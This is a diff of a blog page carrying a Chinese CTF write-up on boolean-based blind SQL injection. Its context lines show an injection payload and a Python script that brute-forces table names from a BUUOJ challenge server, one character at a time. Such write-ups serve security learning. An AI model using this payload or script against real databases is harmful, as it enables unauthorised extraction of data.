@@ -92,7 +92,7 @@
 <meta property="og:image" content="https://i.loli.net/2021/11/11/zvkRMEGBrpo8LST.png">
 <meta property="og:image" content="https://i.loli.net/2021/11/11/pUT2AiCvNOEZkoM.png">
 <meta property="article:published_time" content="2021-11-11T09:08:46.000Z">
-<meta property="article:modified_time" content="2021-11-12T12:23:51.988Z">
+<meta property="article:modified_time" content="2021-11-19T13:39:59.601Z">
 <meta property="article:author" content="liszt_lin">
 <meta property="article:tag" content="-web前端 -mysql">
 <meta name="twitter:card" content="summary">
@@ -389,7 +389,7 @@
 <p>接着要查询数据，我们构建一个这样的payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)).format(flag)^1</span><br></pre></td></tr></table></figure>
 <p>这句payload的原理是将大于号左右两边的字符串进行比较，如果左边较大则返回1，否则返回0，这样我们就可以判断。要注意字段数，如果查询失败应该更改左边的字段数并再次进行注入。</p>
-<p>详细分析下这段payload，就是将f1ag_1s_h3r3_hhhhh表中的数据内容的ascii码值与“flag”字符的ascii值相比（format将前面的{}替换成flag），这样一步步就可以将flag跑出来了。</p>
+<p>详细分析下这段payload，就是将f1ag_1s_h3r3_hhhhh表中的数据内容的ascii码值与“flag”的ascii值相比（format将前面的{}替换成”flag”），这样一步步就可以将flag跑出来了。</p>
 <p>当然，由于这里用的是＞号，因此脚本中要将输出的字符减1，因为判断成功时花括号内的字符是比实际内容大1的。</p>
 <p>最后偷一个大佬的脚本吧：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">url=&#x27;http://ca5cdac5-e97e-42df-9ed0-233bc75b4c4d.node3.buuoj.cn/index.php&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload = &quot;1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;&quot;</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;id&#x27;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
@@ -516,7 +516,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -538,7 +538,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
